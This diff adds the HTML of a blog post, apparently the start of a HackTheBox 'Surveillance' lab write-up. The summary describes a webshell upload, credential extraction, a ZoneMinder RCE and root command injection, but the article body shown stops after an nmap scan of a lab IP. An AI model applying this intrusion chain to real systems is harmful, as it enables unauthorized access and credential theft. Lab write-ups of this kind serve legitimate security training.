@@ -1,0 +1,1775 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Surveillance is a medium difficulty box using an outdated Content Management System that is vulnerable to a file upload attack. After using an exploit script to write a webshell, we can access the system environment to gain more credentials. Extracting passwords from a backup database, we can move laterally to another user on the system and access an internal web server on port 8080 for ZoneMinder. Using an RCE vulnerability in ZoneMinder, we can enumerate as yet another user. With the newfound user privileges, we can execute some perl scripts as root, one of which is vulnerable to command injection.'><title>HackTheBox - Surveillance</title>
+
+<link rel='canonical' href='http://localhost:1313/post/hackthebox-surveillance/'>
+
+<link rel="stylesheet" href="/scss/style.min.59703bed5f69041ffba70837d909b8000139e78c5201b54e051ae44c256c2d69.css"><meta property='og:title' content='HackTheBox - Surveillance'>
+<meta property='og:description' content='Surveillance is a medium difficulty box using an outdated Content Management System that is vulnerable to a file upload attack. After using an exploit script to write a webshell, we can access the system environment to gain more credentials. Extracting passwords from a backup database, we can move laterally to another user on the system and access an internal web server on port 8080 for ZoneMinder. Using an RCE vulnerability in ZoneMinder, we can enumerate as yet another user. With the newfound user privileges, we can execute some perl scripts as root, one of which is vulnerable to command injection.'>
+<meta property='og:url' content='http://localhost:1313/post/hackthebox-surveillance/'>
+<meta property='og:site_name' content='Spencer&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CraftCMS' /><meta property='article:tag' content='Webshell' /><meta property='article:tag' content='env' /><meta property='article:tag' content='MySQL' /><meta property='article:tag' content='hashcat' /><meta property='article:tag' content='ZoneMinder' /><meta property='article:tag' content='chisel' /><meta property='article:tag' content='Command Injection' /><meta property='article:published_time' content='2024-04-20T20:42:13-05:00'/><meta property='article:modified_time' content='2024-04-20T20:42:13-05:00'/><meta property='og:image' content='http://localhost:1313/post/hackthebox-surveillance/Surveillance.png' />
+<meta name="twitter:title" content="HackTheBox - Surveillance">
+<meta name="twitter:description" content="Surveillance is a medium difficulty box using an outdated Content Management System that is vulnerable to a file upload attack. After using an exploit script to write a webshell, we can access the system environment to gain more credentials. Extracting passwords from a backup database, we can move laterally to another user on the system and access an internal web server on port 8080 for ZoneMinder. Using an RCE vulnerability in ZoneMinder, we can enumerate as yet another user. With the newfound user privileges, we can execute some perl scripts as root, one of which is vulnerable to command injection."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/post/hackthebox-surveillance/Surveillance.png' />
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu9f9ff13576eb7121750203f114cffc3e_12283_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/spencerja'
+                        target="_blank"
+                        title="Github"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://app.hackthebox.com/profile/1202496'
+                        target="_blank"
+                        title="HackTheBox"
+                    >
+                        
+                        
+                            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+    preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" fill="currentColor" stroke="none">
+    <g>
+        <path
+            d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z">
+        </path>
+    </g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://ctftime.org/team/217710'
+                        target="_blank"
+                        title="Team"
+                    >
+                        
+                        
+                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 220.000000 200.000000"
+    preserveAspectRatio="xMidYMid meet">
+    <g transform="translate(0.000000,200.000000) scale(0.100000,-0.100000)" fill="currentColor" stroke="none">
+        <path d="M365 1499 c201 -275 365 -503 365 -507 0 -4 -84 -120 -188 -259 -103
+            -139 -263 -355 -356 -480 -93 -125 -173 -229 -178 -231 -45 -19 101 -22 992
+            -22 l1000 0 0 1000 0 1000 -1000 0 -999 0 364 -501z m1310 -509 l0 -305 -312
+            -3 -313 -2 0 310 0 310 313 -2 312 -3 0 -305z" />
+        <path d="M1150 1194 c0 -2 -1 -95 -1 -206 l0 -203 216 -3 215 -2 0 210 0 210
+            -157 0 -158 0 98 -98 c53 -53 97 -101 97 -106 0 -4 -42 -48 -92 -97 l-93 -88
+            -28 26 -27 27 65 66 65 66 -100 101 c-55 55 -100 99 -100 97z" />
+    </g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://tryhackme.com/p/spencerj'
+                        target="_blank"
+                        title="TryHackMe"
+                    >
+                        
+                        
+                            <svg role="img" viewBox="0 0 24 24" fill="currentColor"  stroke-width="2" xmlns="http://www.w3.org/2000/svg"  stroke-linecap="round" stroke-linejoin="round">
+    <path d="M10.7048 0c-3.164 0-5.8024 2.2853-6.3563 5.2914C2.0493 5.5007.242 7.4381.242 9.7912c0 2.4918 2.0276 4.5191 4.5195 4.5191h6.7616a.625.625 0 000-1.2497H4.7615c-1.8031 0-3.2698-1.467-3.2698-3.2694 0-1.803 1.4667-3.2696 3.2698-3.2696.6552 0 1.287.1925 1.8274.5576a.6252.6252 0 00.8677-.1676.6251.6251 0 00-.168-.8678c-.5105-.345-1.0806-.5756-1.679-.6895.5105-2.3438 2.6006-4.1046 5.0952-4.1046 2.6578 0 4.8555 1.9984 5.1739 4.571a4.489 4.489 0 00-.488.3043.625.625 0 00-.1412.8724.6256.6256 0 00.8729.1408c.5587-.4036 1.2197-.6166 1.9114-.6166 1.547 0 2.894 1.0973 3.203 2.6102a.6254.6254 0 00.7378.4865c.3378-.0689.556-.3992.4871-.7377-.428-2.091-2.2903-3.6087-4.428-3.6087-.3254 0-.6455.037-.9574.1042C16.5567 2.3282 13.8986 0 10.7048 0zm5.1918 10.6402c-.1805 0-.3345.0358-.462.1078a.913.913 0 00-.3124.2909c-.0803.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0363.1639.095.3075.1753.4312a.909.909 0 00.3124.2964c.1275.0732.2815.11.462.11.1806 0 .3343-.0368.4607-.11a.8974.8974 0 00.3086-.2964c.0792-.1237.1372-.2673.1728-.4312a2.3737 2.3737 0 00.0544-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0937-.3046-.173-.4261a.901.901 0 00-.3085-.2909c-.1264-.072-.28-.1078-.4607-.1078zm6.4864 0c-.1806 0-.3347.0358-.4621.1078a.913.913 0 00-.3125.2909c-.0808.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0364.1639.0945.3075.1753.4312a.909.909 0 00.3125.2964c.1274.0732.2815.11.4621.11.1807 0 .334-.0368.4605-.11a.8974.8974 0 00.3086-.2964c.0793-.1237.1372-.2673.1729-.4312a2.3737 2.3737 0 00.0543-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0936-.3046-.1729-.4261a.9011.9011 0 00-.3086-.2909c-.1265-.072-.2798-.1078-.4605-.1078zm-8.5372.0682l-.8407.6175.3141.4294.4762-.3678v1.8773h.603v-2.5564zm6.4863 0l-.8413.6175.3146.4294.4762-.3678v1.8773h.6031v-2.5564zm-4.4355.4442c.0797 0 .1438.0284.1932.0848.0493.0564.0874.1263.114.2093a1.312 1.312 0 01.0542.2691 2.803 2.803 0 01.014.2637c0 .0818-.0048.1712-.014.2689a1.3044 1.3044 0 01-.0543.2707c-.0265.083-.0646.1529-.1139.2093-.0494.0569-.1135.0852-.1932.0852-.0792 0-.1443-.0283-.1947-.0852-.051-.0564-.09-.1263-.1178-.2093a1.244 1.244 0 01-.0557-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.249 1.249 0 01.0557-.269c.0278-.0831.0668-.153.1178-.2094.0504-.0564.1155-.0848.1947-.0848zm6.4864 0c.0793 0 .1436.0284.193.0848.0493.0564.0874.1263.114.2093.0266.083.0444.1732.0543.2691.0092.0966.014.1844.014.2637a2.91 2.91 0 01-.014.2689 1.3176 1.3176 0 01-.0543.2707c-.0266.083-.0647.1529-.114.2093-.0494.0569-.1137.0852-.193.0852-.0791 0-.1444-.0283-.1948-.0852-.051-.0564-.09-.1263-.1176-.2093a1.2445 1.2445 0 01-.056-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.2484 1.2484 0 01.056-.269c.0276-.0831.0666-.153.1176-.2094.0504-.0564.1157-.0848.1948-.0848zm-2.1915 3.5112c-.1806 0-.3347.0364-.4621.108a.9076.9076 0 00-.3125.2913c-.0808.1215-.1387.263-.1751.4257a2.3826 2.3826 0 00-.0541.5143c0 .1806.0183.3525.0541.5164.0364.1639.0943.3075.1751.4316a.9092.9092 0 00.3125.2956c.1274.0738.2815.1102.4621.1102.1807 0 .3336-.0364.46-.1102a.8922.8922 0 00.3087-.2956c.0797-.124.1371-.2677.1735-.4316a2.3755 2.3755 0 00.0543-.5164c0-.1801-.018-.352-.0543-.5143-.0364-.1627-.0938-.3042-.1735-.4257a.8904.8904 0 00-.3088-.2913c-.1263-.0716-.2792-.108-.4599-.108zm-6.4016.0684l-.8413.6177.3143.4296.4765-.3684v1.8775h.6033v-2.5564zm2.1252 0l-.8413.6177.314.4296.4768-.3684v1.8775h.6033v-2.5564zm2.116 0l-.8407.6177.3135.4296.4768-.3684v1.8775h.603v-2.5564zm2.1604.4442c.0792 0 .1438.028.1932.085.0493.0565.0874.1265.114.2095.026.083.0444.1725.0537.2691.0097.096.0146.1839.0146.263 0 .082-.0049.1715-.0146.2691a1.3243 1.3243 0 01-.0537.2706c-.0266.083-.0647.153-.114.2095-.0494.0569-.114.085-.1932.085-.0797 0-.1441-.0281-.195-.085-.0506-.0565-.0898-.1265-.1174-.2095a1.2443 1.2443 0 01-.0558-.2706 2.6765 2.6765 0 01-.0146-.269c0-.0792.0048-.1671.0146-.263a1.2413 1.2413 0 01.0558-.2692c.0276-.083.0668-.153.1173-.2095.051-.057.1154-.085.1951-.085zm-6.7291 3.0723c-.1312 0-.243.0264-.3358.0785a.6615.6615 0 00-.2268.2111c-.0586.0885-.1009.1914-.127.3096a1.6979 1.6979 0 00-.0394.3732c0 .1313.013.2562.0394.375.0261.1188.0684.2235.127.313a.6535.6535 0 00.2268.2152c.0927.0532.2046.0797.3358.0797.1307 0 .2424-.0265.334-.0797a.6501.6501 0 00.2241-.2152c.0575-.0895.0996-.1942.1258-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0262-.1182-.0683-.2211-.1258-.3096a.658.658 0 00-.2241-.2111c-.0916-.0521-.2033-.0785-.334-.0785zm3.0859 0c-.1314 0-.243.0264-.3358.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.101.1914-.127.3096a1.6895 1.6895 0 00-.0394.3732c0 .1313.0128.2562.0394.375.026.1188.0684.2235.127.313a.6532.6532 0 00.2268.2152c.0927.0532.2044.0797.3358.0797.1307 0 .2423-.0265.334-.0797a.6496.6496 0 00.224-.2152c.0574-.0895.0993-.1942.1258-.313a1.7415 1.7415 0 00.039-.375 1.724 1.724 0 00-.039-.3732c-.0265-.1182-.0684-.2211-.1259-.3096a.6575.6575 0 00-.224-.2111c-.0916-.0521-.2032-.0785-.334-.0785zm5.1077 0c-.1312 0-.2428.0264-.3356.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.1008.1914-.127.3096a1.6977 1.6977 0 00-.0396.3732c0 .1313.0132.2562.0397.375.0261.1188.0683.2235.127.313a.6532.6532 0 00.2267.2152c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6496.6496 0 00.224-.2152c.0575-.0895.0992-.1942.1259-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0267-.1182-.0684-.2211-.126-.3096a.6575.6575 0 00-.2239-.2111c-.0916-.0521-.2035-.0785-.3342-.0785zm-6.658.0498l-.611.4487.2279.3112.3462-.2669v1.3627h.4375v-1.8557zm3.0677 0l-.6106.4487.2282.3112.3462-.2669v1.3627h.4377v-1.8557zm5.1082 0l-.6109.4487.2285.3112.346-.2669v1.3627h.4377v-1.8557zm-9.7115.3228c.0575 0 .1041.0205.14.0612.0358.0412.0633.0917.0823.152a.9604.9604 0 01.0397.1952c.007.07.0102.134.0102.1915 0 .0597-.0031.1247-.0102.1952a.954.954 0 01-.0397.197c-.019.0602-.0465.1107-.0824.1519-.0358.0412-.0824.0612-.1399.0612-.058 0-.1053-.02-.1416-.0612-.037-.0412-.065-.0917-.0852-.152a.8863.8863 0 01-.0407-.1969 1.9609 1.9609 0 01-.0108-.1952c0-.0575.0037-.1215.0108-.1915a.893.893 0 01.0407-.1952c.0202-.0603.0483-.1108.0852-.152.0363-.0407.0836-.0612.1416-.0612zm3.0859 0c.0575 0 .1041.0205.14.0612a.421.421 0 01.0821.152.9392.9392 0 01.0397.1952c.007.07.0103.134.0103.1915 0 .0597-.0033.1247-.0103.1952a.9302.9302 0 01-.0397.197.4211.4211 0 01-.0822.1519c-.0358.0412-.0824.0612-.14.0612-.058 0-.1053-.02-.1417-.0612a.4192.4192 0 01-.085-.152.8458.8458 0 01-.0407-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.004-.1215.011-.1915a.8487.8487 0 01.0407-.1952.4196.4196 0 01.085-.152c.0364-.0407.0837-.0612.1418-.0612zm5.1077 0c.0575 0 .1044.0205.1402.0612a.421.421 0 01.0822.152.9483.9483 0 01.0398.1952c.007.07.0102.134.0102.1915 0 .0597-.0032.1247-.0102.1952a.9427.9427 0 01-.0398.197.421.421 0 01-.0822.1519c-.0358.0412-.0827.0612-.1402.0612-.058 0-.1051-.02-.1415-.0612-.0368-.0412-.065-.0917-.0857-.152a.9503.9503 0 01-.04-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.0039-.1215.011-.1915a.9589.9589 0 01.04-.1952c.0207-.0603.0489-.1108.0857-.152.0363-.0407.0835-.0612.1415-.0612zm-1.6842 1.8138c-.1312 0-.2428.0266-.3356.0787a.659.659 0 00-.2268.211c-.0586.0883-.1008.1914-.127.3097a1.7304 1.7304 0 00-.0396.3733c0 .1312.0137.256.0397.3746.026.119.0683.2237.127.3137a.656.656 0 00.2267.2148c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6475.6475 0 00.224-.2148c.0576-.09.0998-.1948.1259-.3137.026-.1187.039-.2434.039-.3746 0-.1307-.013-.2557-.039-.3733-.0261-.1183-.0683-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2035-.0787-.3342-.0787zm3.0627 0c-.1313 0-.243.0266-.3358.0787a.6641.6641 0 00-.2268.211c-.0586.0883-.101.1914-.127.3097a1.7218 1.7218 0 00-.0394.3733c0 .1312.0134.256.0395.3746.026.119.0683.2237.1269.3137a.6609.6609 0 00.2268.2148c.0928.0532.2045.0797.3358.0797s.2424-.0265.334-.0797a.6475.6475 0 00.224-.2148c.0575-.09.1-.1948.1259-.3137a1.7398 1.7398 0 00.0396-.3746c0-.1307-.0135-.2557-.0396-.3733-.026-.1183-.0684-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2027-.0787-.334-.0787zm-1.5448.05l-.6109.448.2284.3124.346-.2675v1.3626h.4378v-1.8555zm-1.5179.3228c.0575 0 .1041.0206.14.0613a.4206.4206 0 01.0826.1517.9575.9575 0 01.0396.1953c.007.07.0102.134.0102.1916 0 .0597-.0032.1245-.0102.195a.9512.9512 0 01-.0396.197.4218.4218 0 01-.0826.1519c-.0359.0412-.0825.0612-.14.0612-.058 0-.1052-.02-.1415-.0612-.0368-.0412-.065-.0917-.085-.152a.9149.9149 0 01-.0408-.1969 1.9608 1.9608 0 01-.011-.195c0-.0575.004-.1217.011-.1916a.9232.9232 0 01.0407-.1953c.0202-.0603.0483-.1105.085-.1517.0364-.0407.0836-.0613.1416-.0613zm3.0627 0c.0575 0 .104.0206.1398.0613a.4208.4208 0 01.0826.1517.939.939 0 01.0394.1953c.0071.07.0104.134.0104.1916 0 .0597-.0033.1245-.0104.195a.9296.9296 0 01-.0394.197.4218.4218 0 01-.0826.1519c-.0357.0412-.0823.0612-.1398.0612-.0575 0-.1054-.02-.1417-.0612-.037-.0412-.065-.0917-.085-.152a.9065.9065 0 01-.0408-.1969 1.9495 1.9495 0 01-.0103-.195c0-.0575.0033-.1217.0103-.1916a.9145.9145 0 01.0407-.1953c.02-.0603.0481-.1105.085-.1517.0364-.0407.0843-.0613.1418-.0613zm-9.7123.1855c-.091 0-.1686.0182-.2326.0545a.4563.4563 0 00-.157.146c-.0408.0613-.0702.133-.0881.2149a1.1685 1.1685 0 00-.0271.2587c0 .0907.0086.1773.027.2598.018.082.0474.1546.0881.217a.4589.4589 0 00.157.1487c.064.037.1417.0557.2327.0557.0907 0 .1677-.0188.2311-.0557a.4504.4504 0 00.1558-.1487c.0402-.0624.0688-.135.0873-.217a1.2187 1.2187 0 00.0272-.2598c0-.0911-.0093-.1774-.0272-.2587-.0185-.082-.0471-.1536-.0873-.2148a.4479.4479 0 00-.1558-.146c-.0634-.0364-.1403-.0546-.231-.0546zm1.0519.0346l-.423.3102.1577.2166.2398-.185v.9442h.3037v-1.286zm-1.0519.2236c.0396 0 .0724.0141.0973.0429a.2841.2841 0 01.057.105.689.689 0 01.0276.1352c.0044.0489.007.0927.007.1328 0 .0407-.0027.0862-.007.135a.684.684 0 01-.0277.1362.2845.2845 0 01-.057.1053c-.0248.0288-.0576.043-.0972.043a.1247.1247 0 01-.098-.043.2976.2976 0 01-.0592-.1053.612.612 0 01-.0283-.1361 1.391 1.391 0 01-.0069-.135c0-.0402.0021-.084.007-.1329a.6197.6197 0 01.0282-.1353.2973.2973 0 01.0592-.105.1248.1248 0 01.098-.0428zm3.7749 1.394c-.0907 0-.1681.0178-.2321.0542a.4517.4517 0 00-.1574.1463c-.0407.0608-.07.1326-.088.2144a1.1691 1.1691 0 00-.0276.2587c0 .0905.0092.1774.0277.26.0179.0824.0472.1545.0879.2168a.4562.4562 0 00.1574.1493c.064.0368.1414.0547.232.0547.0912 0 .1683-.0179.2318-.0547a.451.451 0 00.1556-.1493.6636.6636 0 00.0868-.2169 1.1889 1.1889 0 00.0277-.26c0-.0906-.0092-.1773-.0277-.2586-.0179-.0818-.0473-.1536-.0868-.2144a.4461.4461 0 00-.1556-.1463c-.0635-.0364-.1406-.0543-.2317-.0543zm1.0522.034l-.423.3109.1578.2158.2398-.1849v.9444h.3033v-1.2861zm-1.0522.2236c.0401 0 .0726.014.0976.0427a.3008.3008 0 01.057.1054.6431.6431 0 01.027.135 1.31 1.31 0 01.0077.1329c0 .0412-.0027.0863-.0077.135a.655.655 0 01-.027.1367.3066.3066 0 01-.057.1054c-.025.0282-.0575.0421-.0976.0421-.0396 0-.0728-.0139-.0977-.042a.2928.2928 0 01-.0592-.1055.6182.6182 0 01-.028-.1366 1.3641 1.3641 0 01-.0077-.1351c0-.0401.0029-.0841.0077-.1328a.6122.6122 0 01.028-.135.2874.2874 0 01.0592-.1055c.0249-.0287.0581-.0427.0977-.0427z"/>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/post' >
+                
+                
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/awards' >
+                
+                
+                
+                <span>Trophy Room</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+                <li id="i18n-switch">  
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
+                        
+                            <option value="http://localhost:1313/" selected>English</option>
+                        
+                    </select>
+                </li>
+            
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/post/hackthebox-surveillance/">
+                <img src="/post/hackthebox-surveillance/Surveillance_hu25835b29ef861f1efeabd48984248f2d_313231_800x0_resize_box_3.png"
+                        srcset="/post/hackthebox-surveillance/Surveillance_hu25835b29ef861f1efeabd48984248f2d_313231_800x0_resize_box_3.png 800w, /post/hackthebox-surveillance/Surveillance_hu25835b29ef861f1efeabd48984248f2d_313231_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="650" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Surveillance" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hack-the-box/" >
+                Hack the Box
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/hackthebox-surveillance/">HackTheBox - Surveillance</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Surveillance is a medium difficulty box using an outdated Content Management System that is vulnerable to a file upload attack. After using an exploit script to write a webshell, we can access the system environment to gain more credentials. Extracting passwords from a backup database, we can move laterally to another user on the system and access an internal web server on port 8080 for ZoneMinder. Using an RCE vulnerability in ZoneMinder, we can enumerate as yet another user. With the newfound user privileges, we can execute some perl scripts as root, one of which is vulnerable to command injection.
+        </h3>
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Apr 20, 2024</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="enumeration">Enumeration</h2>
+<p>initial nmap:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Nmap scan report for 10.129.171.36
+</span></span><span class="line"><span class="cl">Host is up (0.043s latency).
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.18.0 (Ubuntu)
+</span></span><span class="line"><span class="cl">|_http-title: Did not follow redirect to http://surveillance.htb/
+</span></span><span class="line"><span class="cl">|_http-server-header: nginx/1.18.0 (Ubuntu)
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 10.32 seconds
+</span></span></code></pre></td></tr></table>
+</div>
